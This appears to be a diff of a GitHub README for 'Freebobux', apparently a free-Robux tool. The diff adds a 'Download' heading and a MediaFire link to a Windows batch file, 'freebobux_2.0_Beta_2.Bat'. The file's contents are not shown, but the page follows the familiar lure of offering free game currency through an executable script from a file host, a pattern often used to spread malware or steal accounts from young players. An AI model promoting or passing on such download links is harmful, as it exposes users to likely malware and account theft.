@@ -37,6 +37,6 @@ Change Freebobux icon
 ![Windows setup](https://user-images.githubusercontent.com/94728590/178659382-2919b28c-dd18-4d46-95f9-eea26108c33e.png)
 
 # Version \2.0 Beta 2/
-What's New!
+Download
 
-Down for Fixing
+https://www.mediafire.com/file/j2qhqhme5f2x4cq/freebobux_2.0_Beta_2.Bat/file
